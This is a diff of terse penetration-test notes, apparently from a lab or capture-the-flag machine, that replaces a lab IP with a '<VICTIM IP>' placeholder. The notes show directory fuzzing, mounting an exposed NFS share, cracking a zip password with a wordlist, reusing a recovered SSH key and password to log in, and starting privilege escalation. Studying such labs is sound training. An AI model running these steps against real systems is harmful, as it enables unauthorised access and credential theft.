@@ -1,6 +1,6 @@
 for port 80:
 	running	bolt cms?	
-	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.50.196/FUZZ
+	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<VICTIM IP>/FUZZ
 	returns public, src, app, vendor, extensions, server-status
 	
 	
@@ -9,12 +9,12 @@ for port 80:
 	
 for port 8080:
 	php info page		
-	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.50.196:8080/FUZZ
+	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<VICTIM IP>:8080/FUZZ
 	returns dev, server-status
 	
 	
 	
-	jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash -> Found our jp guy -> lets try ssh -> use password I_love_java -> $ ssh -i id_rsa jeanpaul@192.168.50.196 in /mnt/dev and it works -> we are in
+	jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash -> Found our jp guy -> lets try ssh -> use password I_love_java -> $ ssh -i id_rsa jeanpaul@<VICTIM IP> in /mnt/dev and it works -> we are in
 	
 	now privilege escalation...
 		jeanpaul@dev:~$ sudo -l
@@ -42,15 +42,15 @@ for port 8080:
 		
 		
 for port 2049:
-	$ showmount -e 192.168.50.196
-		Export list for 192.168.50.196:
+	$ showmount -e <VICTIM IP>
+		Export list for <VICTIM IP>:
 		/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
 	$ sudo mkdir /mnt/dev/
-	$ mount -t nts 192.168.50.196:/srv/nfs /mnt/dev
+	$ mount -t nts <VICTIM IP>:/srv/nfs /mnt/dev
 	$ cd /mnt/dev
 	$ ls -> save.zip?
 	$ unzip save.zip -> use fcrackzip to get password (sudo apt install fcrackzip)
 	$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip -> "java101" is the pw
 	$ unzip save.zip -> there is id_rsa -> we can use it to ssh to the pc
-	$ ssh -i id_rsa jp@192.168.50.196 -> is 'jp' a user?
+	$ ssh -i id_rsa jp@<VICTIM IP> -> is 'jp' a user?
 	
